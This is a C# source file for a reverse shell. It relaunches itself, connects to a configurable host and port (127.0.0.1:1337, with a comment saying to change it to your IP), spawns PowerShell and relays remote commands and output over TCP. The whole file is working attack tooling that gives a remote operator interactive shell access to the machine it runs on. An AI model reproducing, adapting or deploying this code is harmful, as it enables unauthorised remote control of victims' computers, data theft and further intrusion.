using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace basic_tcp_rev
{
    class Program
    {
        static TcpClient client;
        static StreamReader reader;
        static StreamWriter writer;

        //TODO: Temp
        static bool firstLine;

        static void Main(string[] args)
        {
            Process[] processes = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
            if (processes.Length < 2)
            {
                // Spawn another process, this one will do the connect
                string exe = Process.GetCurrentProcess().MainModule.FileName;
                Process launcher = new Process();
                launcher.StartInfo.FileName = exe;
                launcher.StartInfo.CreateNoWindow = false;
                launcher.Start();
                Thread.Sleep(1000);
                Process.GetCurrentProcess().Kill();
            }

            client = new TcpClient();
            try
            {
                client.Connect("127.0.0.1", 1337); //TODO: Change to your IP and Port
                NetworkStream netstream = client.GetStream();
                reader = new StreamReader(netstream);
                writer = new StreamWriter(netstream);
                writer.AutoFlush = true;
            } catch(Exception ex)
            {

            }

            Process p = new Process();
            p.StartInfo.FileName = "powershell.exe";
            p.StartInfo.CreateNoWindow = false;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.OutputDataReceived += new DataReceivedEventHandler(outputHandler);
            p.Start();
            p.BeginOutputReadLine();
            p.StandardInput.WriteLine("");
            while (true)
            {
                try
                {
                    string input = reader.ReadLine();
                    input += "\n";
                    firstLine = true;
                    p.StandardInput.WriteLine(input);
                } catch(Exception ex)
                {
                    break;
                }
            }
        }

        private static void outputHandler(object sender, DataReceivedEventArgs e)
        {
            string output = e.Data.Trim();
            if(!string.IsNullOrEmpty(output))
            {
                if (firstLine)
                {
                    firstLine = false;
                    return;
                }
                if(output.StartsWith("PS") && output.EndsWith(">"))
                {
                    writer.Write(output);
                } else
                {
                    writer.WriteLine(output);
                }
                writer.Flush();
            }

        }
    }
}
